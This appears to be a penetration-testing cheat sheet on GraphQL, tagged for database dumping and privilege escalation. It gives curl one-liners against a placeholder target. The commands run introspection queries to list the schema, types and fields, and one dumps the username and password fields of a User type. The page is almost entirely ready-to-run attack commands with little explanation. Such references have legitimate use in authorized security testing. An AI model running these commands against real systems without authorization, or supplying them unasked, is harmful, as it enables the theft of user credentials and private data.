---
title: "Graphql"
date: 2024-7-9
tags: ["Database Dumping", "Privilege Escalation In Databases", "Graphql", "Database"]
---

### Visualize Tool

```console
+---------------------------------------------------------------+
| 1. Change Schema -> Introspection -> Copy Introspection Query |
| 2. Paste query                                                |
| 3. Display                                                    |
+---------------------------------------------------------------+
```

<small>*Ref: [graphql-voyager](https://graphql-kit.com/graphql-voyager/)*</small>

### General

```console
# Get fields from schema
curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name,fields{name,description}}}}"}' | jq .
```

```console
# Get types name
curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq .
```

```console
# Get fields of type (e.g. User)
curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){name,fields{name}}}"}' | jq .
```

```console
# Dump data from type (e.g. User type with fields username and password)
curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{User{username,password}}"}' | jq .
```
